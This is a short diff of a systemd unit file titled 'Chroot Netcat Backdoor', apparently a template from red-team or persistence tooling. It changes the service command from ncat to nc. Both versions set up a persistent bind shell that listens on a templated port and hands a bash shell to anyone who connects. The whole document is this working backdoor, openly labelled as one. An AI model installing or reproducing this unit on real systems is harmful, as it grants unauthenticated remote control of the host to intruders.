@@ -3,7 +3,7 @@ Description=Chroot Netcat Backdoor
 After=network.target
 
 [Service]
-ExecStart=/usr/sbin/chroot /opt/chroot ncat -l -p {{ random_port }} -e /bin/bash -k
+ExecStart=/usr/sbin/chroot /opt/chroot nc -l -p {{ random_port }} -e /bin/bash -k
 ExecReload=/bin/kill -HUP $MAINPID
 KillMode=process
 WorkingDirectory=/tmp/
